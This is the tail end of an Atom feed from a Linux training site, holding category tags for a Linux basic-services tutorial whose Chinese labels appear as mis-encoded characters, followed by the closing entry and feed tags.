      <category term="Linuxç®€æ˜“æœåŠ¡æ•™ç¨‹" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/Linux%E7%AE%80%E6%98%93%E6%9C%8D%E5%8A%A1%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="åŸ¹è®­" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxåŸºç¡€æœåŠ¡" scheme="http://www.toberoot.com/tags/Linux%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
</feed>
